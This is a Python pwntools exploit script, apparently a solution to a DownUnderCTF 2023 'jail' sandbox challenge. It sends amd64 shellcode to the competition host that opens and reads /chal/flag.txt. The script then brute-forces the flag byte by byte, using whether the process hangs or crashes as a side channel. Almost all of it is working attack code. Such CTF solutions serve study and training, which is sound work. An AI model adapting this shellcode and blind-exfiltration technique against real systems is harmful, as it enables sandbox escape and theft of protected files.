#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template jail
from pwn import *

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('jail')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

flag = ''
shell = """
mov rax,0x101 
mov rsi,0x7478742e6761 
push rsi
mov rsi,0x6c662f6c6168632f
push rsi
push rsp
pop rsi
xor rdx,rdx
syscall
mov rdi,rax
xor rax,rax
mov rsi,rsp
mov rdx,0xff
syscall
mov rax,{0}
loop:
    
    cmp al,[rsp+{1}]
    je loop
"""
#exploitation idea is:
#file = openat(rdi,/chal/flag.txt);
#read(file,[rsp],256);
#for(int=0;j<256;j++){
#   flag_byte=byte[rsp+j]
#   for(int i=' ';i<'z';i++){
#       if(i==flag_byte){
#           i--;
#           //get into endless cycle if flag_byte = i
#       }
#   }
#}
# //if flag_byte != i throw segfault and EOFerror  
#
for j in range(0,256):#flag len

    for i in range(0x20,0x7f): #ascii sym
        io = remote('2023.ductf.dev' ,30010)
        shellcode = asm(shell.format(hex(i),hex(j)),arch='amd64')
        io.sendline(shellcode)
        r = io.recv()
        try:
            io.recv(timeout=2) #check for endless cycle: if true get byte
            print("byte: "+str(i))
            flag+=chr(i)
            break
        except EOFError as e: #if flag_byte!=i=our byte
            None
        finally:
            io.close()

    print(flag)
io.interactive()

